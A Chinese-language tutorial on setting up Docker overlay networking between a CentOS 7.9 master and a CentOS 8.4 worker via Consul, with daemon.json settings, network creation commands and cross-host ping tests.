<p>Overlay网络模式相比于桥接模式的特别之处在于，它可以自定多个--subnet子网网段，只有同一网络/段中的容器才可以相互交换信息（相互通信）。</p>
<p>需要注意的是如果设置了多个--subnet，也需要同步设定对应个数的--gateway网关，需要确保各子网网段不重叠。</p>
<p>如何查看容器的子网网段，docker insect contain_name即可，当然在docker run 容器时，也可以通过--subnet 指定子网网段 。</p>
</blockquote>
<p>示例（了解范畴）：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> create</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> overlay</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --subnet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 192.168.0.0/16</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --subnet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 192.170.0.0/16</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --gateway</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 192.168.0.100</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --gateway</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 192.170.0.100</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --ip-range=192.168.1.0/24</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --aux-address=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"my-router=192.168.1.5"</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --aux-adress=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"my-switch=192.168.1.16"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --aux-address=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"my-router=192.170.1.5"</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --aux-adress=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"my-switch=192.170.1.16"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> myoverlaynet</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>预告</h3>
<blockquote>
<p>通过对本知识点的学习，你将掌握，通过docker create 自定义网络-d自定义网络指定为overlay 网络模式，从而实现跨宿主机通信，同时可以了解一下consul镜像的使用。</p>
</blockquote>
<p>注： Consul是一个分布式、高可用性和多数据中心感知工具，用于服务发现、配置和编排。Consul 支持大规模快速部署、配置和维护面向服务的架构。欲了解更多信息，请参阅 Consul架构指南。</p>
<h3>1.docker pull 拉取consul镜像，并运行容器</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pull</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> consul</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #拉取镜像</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> images</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 8500:8500</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> consul</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> consul:latest</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #启动sonsul容器</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">netstat</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -nalpt</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #查看端口占用情况</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>2.修改主/从节点的daemon.json，并重启docker和consul服务</h3>
<h4>1）修改主节点CentOS 7.9</h4>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/docker/daemon.json</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>注：在修改之前，你本地的这个文件可能只有一行，大概应该是仅配了（阿里）镜像加速。可参考如下配置，前两行可以不配置，使用默认的就可以。最后三行是要配的。</p>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-json"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "graph"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"/var/lib/docker"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "storage-driver"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"overlay"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "registry-mirrors"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.zhai.cm"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://a.ussh.net"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://hub.littlediary.cn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://hub.rat.dev"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://atomhub.openatom.cn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.m.daocloud.io"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.1ms.run"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://dytt.online"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://func.ink"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://lispy.org"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.xiaogenban1993.com"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.mybacc.com"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.yomansunter.com"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://dockerhub.websoft9.com"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  ],</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "cluster-store"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"consul://192.168.31.100:8500"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "cluster-advertise"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"192.168.31.100:2375"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "live-restore"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">true</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>注意：修改的时候，注意引号要是英文的，除最后一行外，前面的每行尾部都有一个英文逗号（否则docker服务将无法正常启动！！）。</p>
<p>首行的graph是配置docker数据（镜像、容器等）默认存储位置，可以据需修改，默认位置就是/var/lib/docker，（有人习惯修改为/data/docker）。
第二行的storage-driver，是驱动模式指定为overlay。
第三行是配置的阿里云镜像仓库地址
第四行cluster-store，是配置sonsul集群的访问地址
第五行cluster-advertise，是广播通信地址和端口。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"live-restore"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:true</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 和</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  –restart=always用法和意义各不相同。</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>配置前者的意义在于即使docker的daemon守护进程关闭，其里面的容器依然保持运行，后者是指容器在docker run 启动时，佩带了该参数，则在出现故障（内存泄露等）时，自动重启容器。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> daemon-reload</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #使daemon.json重新生效</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> #重启docker</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -a</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">   #可以看到consul的状态是Exited</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> start</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> consul</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #再次手动启动consul容器</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><a href="http://192.168.31.100:8500" target="_blank" rel="noopener noreferrer">http://192.168.31.100:8500</a> 访问consul（这个IP地址是在上面的/etc/docker/daemon.json中配置的）</p>
<h4>2）修改从节点CentOS8.4</h4>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/docker/daemon.json</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>有了上面配置的基础，从节点配置简单一点，其他配使用默认就可以。仅配置下面的三行。需要注意的是集群广播监听的地址cluster-advertise，要配置为从节点自己的IP。</p>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-json"><span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"cluster-store"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"consul://192.168.31.100:8500"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"cluster-advertise"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"192.168.31.130:2375"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"live-restore"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">true</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>切记：除最后一行外，每行配置末尾都有英文逗号！！！cluster-store是集群中主节点访问地址；cluster-advertise是当前节点的IP和广播端口，别误写成主节点的IP了，否则docker无法重启 ,错误如下: "systemctl status network.service" and "journalctl -xe" for details。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> daemon-reload</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #使daemon.json重新生效</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> #重启docker</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>3.在主节点创建overlay网络后，分别在主、从节点查看</h3>
<h4>1）创建前自定义网络前，分别查看主从节点的已有网络（便于对比效果）</h4>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #分别在主从节点执行该查代码</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h4>2）在master主节点CentOS 7.9 上创建自定义网络mynet</h4>
<h1>在主节点创建自定义网络：分别指定网络模式、子网网段、网关、网卡最大传输单元 ，更详细参数见：</h1>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> create</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --help</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> create</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --driver</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> overlay</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --ingress</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --subnet=172.31.0.0/16</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --gateway=172.31.0.2</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --opt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> com.docker.network.driver.mtu=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1200</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mynet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>注： com.docker.network.driver.mtu 等价于--mtu，用来设置容器网卡最大传输单元</p>
<p>可以看到自定义网络mynet创建成功，创建时指定网络模式为overlay</p>
<p>提示：如果创建时错误提示Error response from daemon: error getting pools config from store: could not get pools config from store，docker start consul 重新启动容器服务即可。</p>
<h4>3）切回从节点 CentOS 8.4 ，查看在 CentOS 7.9 主节点创建的网络</h4>
<p>发现，从节点CentOS8.4上，可以看到主节点创建的mynet自定义网络，而本身并没有创建这个网络，原理就是通过/etc/docker/daemon.json中的配置集群信息的集群地址cluster-store和广播cluster-advertise来实现主从共享网络的。</p>
<h3>4.在主节点使用自定义的overlay网络模式启动nginx，并查看其I</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> images</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mynet</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx:alpine</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">   #主节点使用自定义网络启动</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> inspect</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> #查看网络详细信息</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>主节点nginx的虚拟IP地址：172.31.0.1</p>
<h3>5.在从节点上使用自定义的overlay网络模式开启tomcat，尝试和nginx互通</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> images</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -a</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tomcat</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mynet</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 8080:8080</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tomcat:alpine</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> #和主节点指定同一个网络</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ping</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -w</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.31.0.1</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #尝试在从节点上去ping主节点的nginx的虚拟ip</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>发现，通过该方式（在/etc/docker/daemon.json中配置）是可以实现跨宿主机通信的。</p>
<p>注：该方式，在容器内部不能使用容器别名相互识别，也就是说A容器内部，不识别B容器的别名，尽管他们都共同链接一个网络mynet，但是仅能够通过各自的虚拟IP互通。如要实现容器内部互认别名，点进入点击进入。</p>
<h3>6.在从节点上不使用自定义的overlay网络模式开启tomcat，尝试和nginx互通</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tomcat</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -it</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tomcat</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 8080:8080</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tomcat:alpine</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  /bin/bash</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ping</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -w</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.31.0.1</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>发现从节点，在启动tomcat时不指定network为(主节点)自定义的mynet网络，也是可以ping通nginx的虚拟IP，从而实现跨宿主机通信。</p>
